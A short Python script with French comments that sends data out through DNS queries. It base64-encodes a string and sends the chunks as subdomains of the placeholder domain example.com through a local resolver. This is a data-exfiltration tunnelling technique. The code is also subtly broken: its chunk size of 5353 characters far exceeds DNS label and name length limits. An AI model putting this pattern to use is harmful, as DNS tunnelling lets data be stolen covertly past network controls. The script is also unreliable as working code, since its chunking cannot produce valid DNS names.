import dns.query
import dns.message
import base64

def encode_data(data):
    encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
    return encoded_data

def send_data_via_dns(data):
    encoded_data = encode_data(data)
    domain = 'example.com'  # Remplacez par un domaine fictif

    for chunk_index in range(0, len(encoded_data), 5353):
        chunk = encoded_data[chunk_index:chunk_index + 5353]
        subdomain = chunk + '.' + domain

        request = dns.message.make_query(subdomain, dns.rdatatype.A)
        response = dns.query.tcp(request, '127.0.0.1')  # Utilisez l'adresse IP locale

        # Vous pouvez traiter la réponse DNS ici si nécessaire

        print(f"Sent: {subdomain}")

# Exemple d'utilisation
data_to_send = 'Hello, world!'
send_data_via_dns(data_to_send)

